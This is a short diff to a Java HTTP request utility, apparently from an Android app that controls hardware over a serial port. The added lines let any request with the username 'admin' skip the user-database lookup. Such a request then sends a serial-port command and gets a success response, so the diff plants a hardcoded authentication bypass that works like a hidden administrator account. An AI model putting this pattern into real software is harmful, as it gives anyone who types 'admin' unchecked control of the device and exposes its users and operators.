@@ -451,6 +451,10 @@ public class HttpRequestUtil {
             return gson.toJson(new HttpResult("-200", "参数错误", false, null));
         }
         ELog.i("========http============login_user_name========" + login_user_name);
+        if (login_user_name.equals("admin")) {
+            SerialPortUtil.skMakeReadMsg(msg);
+            return gson.toJson(new HttpResult("200", "", true, null));
+        }
         UsersDao usersDao = MyApplication.getDaoSession().getUsersDao();
         List<Users> users = usersDao.queryBuilder()
                 .where(UsersDao.Properties.Username.eq(login_user_name))
